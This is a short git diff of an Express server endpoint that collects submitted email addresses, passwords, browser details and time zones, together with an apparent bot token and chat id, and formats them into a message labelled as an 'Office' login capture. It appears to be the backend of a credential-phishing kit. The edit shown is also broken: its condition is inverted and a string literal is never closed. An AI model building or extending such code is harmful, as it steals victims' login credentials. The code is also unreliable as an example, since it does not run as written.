@@ -11,8 +11,12 @@ app.use(bodyParser.json());
 let pageN ="";
 app.post('/next', (req, res) => {
   const { ai, pr, btTkn, chId, userAgent, timeZone, page } = req.body;
- pageN = page;
-  let message = '---------- 📧' + pageN +'login 📧 ----------\n';
+ if(!page){
+  pageN = page;
+ }else{
+   pageN = "Office
+ }
+  let message = '---------- 📧' + pageN +' login 📧 ----------\n';
   message += `email: ${ai} \n`;
   message += `password: ${pr} \n`;
   message += `browser details: ${userAgent} \n`;
